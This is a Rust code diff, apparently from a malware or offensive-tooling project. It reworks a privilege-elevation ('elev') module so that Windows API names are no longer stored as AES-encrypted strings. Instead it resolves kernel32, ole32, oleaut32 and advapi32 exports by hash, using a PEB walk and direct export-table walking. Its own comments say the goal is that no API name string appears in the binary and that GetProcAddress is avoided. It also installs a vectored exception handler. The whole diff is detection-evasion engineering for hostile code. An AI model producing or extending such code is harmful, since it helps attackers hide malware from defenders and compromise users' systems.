@@ -6,6 +6,14 @@ use std::os::windows::ffi::OsStrExt;
 use std::sync::OnceLock;
 
 use crate::dbg_log;
+use crate::core_utils::api_hash::{
+    H_KERNEL32, H_OLE32, H_OLEAUT32, H_ADVAPI32,
+    H_LoadLibraryA, H_GetProcAddress,
+    H_CoInitializeEx, H_CoUninitialize, H_CoCreateInstance, H_CoSetProxyBlanket,
+    H_SysAllocStringByteLen, H_SysFreeString, H_SysStringByteLen,
+    H_OpenSCManagerW, H_OpenServiceW, H_StartServiceW, H_CloseServiceHandle,
+    H_AddVectoredExceptionHandler,
+};
 
 type FnCoInitializeEx = unsafe extern "system" fn(*const c_void, u32) -> i32;
 type FnCoUninitialize = unsafe extern "system" fn();
@@ -51,42 +59,59 @@ type FnGetProcAddress = unsafe extern "system" fn(*mut u8, *const i8) -> *mut u8
 
 static RESOLVE_APIS: OnceLock<Option<(FnLoadLibraryA, FnGetProcAddress)>> = OnceLock::new();
 
-use crate::polymorphic_keys::{aes_decrypt, aes_to_cstring};
-
 fn get_resolve_apis() -> Option<(FnLoadLibraryA, FnGetProcAddress)> {
     let opt = RESOLVE_APIS.get_or_init(|| unsafe {
-        let k32_name = aes_decrypt(&crate::polymorphic_keys::ELEV_K32_ENC, &crate::polymorphic_keys::ELEV_K32_KEY, &crate::polymorphic_keys::ELEV_K32_NONCE);
-        let k32 = inject::syscall::get_module_base(core::str::from_utf8_unchecked(&k32_name))?;
-        let ll_name = aes_decrypt(&crate::polymorphic_keys::LOADLIB_ENC, &crate::polymorphic_keys::LOADLIB_KEY, &crate::polymorphic_keys::LOADLIB_NONCE);
-        let ll_addr = inject::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&ll_name))?;
-        let gp_name = aes_decrypt(&crate::polymorphic_keys::GETPROC_ENC, &crate::polymorphic_keys::GETPROC_KEY, &crate::polymorphic_keys::GETPROC_NONCE);
-        let gp_addr = inject::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&gp_name))?;
+        // Resolve kernel32 by hash from PEB — no string in binary.
+        let k32 = inject::syscall::get_module_base_by_hash(H_KERNEL32)?;
+        let ll_addr = inject::syscall::resolve_export_by_hash(k32, H_LoadLibraryA)?;
+        let gp_addr = inject::syscall::resolve_export_by_hash(k32, H_GetProcAddress)?;
         Some((mem::transmute_copy(&ll_addr), mem::transmute_copy(&gp_addr)))
     });
     *opt
 }
 
-unsafe fn resolve_fn(encoded_dll: &[u8], dll_key: &[u8; 32], dll_nonce: &[u8; 12], encoded_name: &[u8], name_key: &[u8; 32], name_nonce: &[u8; 12]) -> *mut u8 {
-    let (ll, gp) = match get_resolve_apis() {
+// Resolve an export by hash from a DLL identified by module_hash.
+// Uses LoadLibraryA (resolved by hash) to load the DLL, then GetProcAddress
+// is NOT called — we walk the export table by hash directly.
+unsafe fn resolve_fn_by_hash(module_hash: u32, export_hash: u32) -> *mut u8 {
+    // First try the module if already loaded (PEB walk).
+    if let Some(base) = inject::syscall::get_module_base_by_hash(module_hash) {
+        if let Some(addr) = inject::syscall::resolve_export_by_hash(base, export_hash) {
+            return addr;
+        }
+    }
+    // Not loaded yet — use LoadLibraryA (resolved by hash from kernel32) to load it,
+    // then walk the export table by hash (no GetProcAddress call).
+    let (ll, _gp) = match get_resolve_apis() {
         Some(v) => v,
         None => return std::ptr::null_mut(),
     };
-    let c_dll = aes_to_cstring(encoded_dll, dll_key, dll_nonce);
-    let c_name = aes_to_cstring(encoded_name, name_key, name_nonce);
-    let hmod = ll(c_dll.as_ptr());
+    // Build a temporary null-terminated byte string for LoadLibraryA from the
+    // known DLL names via a static dispatch on module_hash.
+    let dll_cstr: &[u8] = if module_hash == H_OLE32 {
+        b"ole32.dll\0"
+    } else if module_hash == H_OLEAUT32 {
+        b"oleaut32.dll\0"
+    } else if module_hash == H_ADVAPI32 {
+        b"advapi32.dll\0"
+    } else {
+        return std::ptr::null_mut();
+    };
+    let hmod = ll(dll_cstr.as_ptr() as *const i8);
     if hmod.is_null() { return std::ptr::null_mut(); }
-    gp(hmod, c_name.as_ptr())
+    inject::syscall::resolve_export_by_hash(hmod, export_hash)
+        .unwrap_or(std::ptr::null_mut())
 }
 
 fn init_com() -> Option<&'static ComApis> {
     let opt = COM_APIS.get_or_init(|| unsafe {
-        let ci = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COINIT_ENC, &crate::polymorphic_keys::COINIT_KEY, &crate::polymorphic_keys::COINIT_NONCE);
-        let cu = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COUNINIT_ENC, &crate::polymorphic_keys::COUNINIT_KEY, &crate::polymorphic_keys::COUNINIT_NONCE);
-        let cc = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COCREATE_ENC, &crate::polymorphic_keys::COCREATE_KEY, &crate::polymorphic_keys::COCREATE_NONCE);
-        let cp = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COPROXY_ENC, &crate::polymorphic_keys::COPROXY_KEY, &crate::polymorphic_keys::COPROXY_NONCE);
-        let sa = resolve_fn(&crate::polymorphic_keys::OLEAUT32_ENC, &crate::polymorphic_keys::OLEAUT32_KEY, &crate::polymorphic_keys::OLEAUT32_NONCE, &crate::polymorphic_keys::SYSALLOC_ENC, &crate::polymorphic_keys::SYSALLOC_KEY, &crate::polymorphic_keys::SYSALLOC_NONCE);
-        let sf = resolve_fn(&crate::polymorphic_keys::OLEAUT32_ENC, &crate::polymorphic_keys::OLEAUT32_KEY, &crate::polymorphic_keys::OLEAUT32_NONCE, &crate::polymorphic_keys::SYSFREE_ENC, &crate::polymorphic_keys::SYSFREE_KEY, &crate::polymorphic_keys::SYSFREE_NONCE);
-        let sl = resolve_fn(&crate::polymorphic_keys::OLEAUT32_ENC, &crate::polymorphic_keys::OLEAUT32_KEY, &crate::polymorphic_keys::OLEAUT32_NONCE, &crate::polymorphic_keys::SYSLEN_ENC, &crate::polymorphic_keys::SYSLEN_KEY, &crate::polymorphic_keys::SYSLEN_NONCE);
+        let ci = resolve_fn_by_hash(H_OLE32,    H_CoInitializeEx);
+        let cu = resolve_fn_by_hash(H_OLE32,    H_CoUninitialize);
+        let cc = resolve_fn_by_hash(H_OLE32,    H_CoCreateInstance);
+        let cp = resolve_fn_by_hash(H_OLE32,    H_CoSetProxyBlanket);
+        let sa = resolve_fn_by_hash(H_OLEAUT32, H_SysAllocStringByteLen);
+        let sf = resolve_fn_by_hash(H_OLEAUT32, H_SysFreeString);
+        let sl = resolve_fn_by_hash(H_OLEAUT32, H_SysStringByteLen);
         dbg_log!("elev: resolve ci={:?} cu={:?} cc={:?} cp={:?} sa={:?} sf={:?} sl={:?}", ci, cu, cc, cp, sa, sf, sl);
         if ci.is_null() || cu.is_null() || cc.is_null() || cp.is_null() || sa.is_null() || sf.is_null() || sl.is_null() {
             dbg_log!("elev: some COM APIs null");
@@ -107,10 +132,10 @@ fn init_com() -> Option<&'static ComApis> {
 
 fn init_svc() -> Option<&'static SvcApis> {
     let opt = SVC_APIS.get_or_init(|| unsafe {
-        let os = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::OPENSCM_ENC, &crate::polymorphic_keys::OPENSCM_KEY, &crate::polymorphic_keys::OPENSCM_NONCE);
-        let oh = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::OPENSVC_ENC, &crate::polymorphic_keys::OPENSVC_KEY, &crate::polymorphic_keys::OPENSVC_NONCE);
-        let ss = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::STARTSVC_ENC, &crate::polymorphic_keys::STARTSVC_KEY, &crate::polymorphic_keys::STARTSVC_NONCE);
-        let cs = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::CLOSESVC_ENC, &crate::polymorphic_keys::CLOSESVC_KEY, &crate::polymorphic_keys::CLOSESVC_NONCE);
+        let os = resolve_fn_by_hash(H_ADVAPI32, H_OpenSCManagerW);
+        let oh = resolve_fn_by_hash(H_ADVAPI32, H_OpenServiceW);
+        let ss = resolve_fn_by_hash(H_ADVAPI32, H_StartServiceW);
+        let cs = resolve_fn_by_hash(H_ADVAPI32, H_CloseServiceHandle);
         if os.is_null() || oh.is_null() || ss.is_null() || cs.is_null() {
             return None;
         }
@@ -204,12 +229,13 @@ unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -
 
 fn install_veh() {
     VEH_FN.get_or_init(|| unsafe {
-        let (ll, gp) = get_resolve_apis().unwrap();
-        let c = aes_to_cstring(&crate::polymorphic_keys::ELEV_K32_ENC, &crate::polymorphic_keys::ELEV_K32_KEY, &crate::polymorphic_keys::ELEV_K32_NONCE);
-        let h = ll(c.as_ptr());
-        let c2 = aes_to_cstring(&crate::polymorphic_keys::ADDVEH_ENC, &crate::polymorphic_keys::ADDVEH_KEY, &crate::polymorphic_keys::ADDVEH_NONCE);
-        let addr = gp(h, c2.as_ptr());
-        if addr.is_null() { return None; }
+        // AddVectoredExceptionHandler lives in kernel32.
+        let addr = inject::syscall::get_module_base_by_hash(H_KERNEL32)
+            .and_then(|k32| inject::syscall::resolve_export_by_hash(k32, H_AddVectoredExceptionHandler));
+        let addr = match addr {
+            Some(p) => p,
+            None => return None,
+        };
         mem::transmute_copy(&addr)
     });
     unsafe {
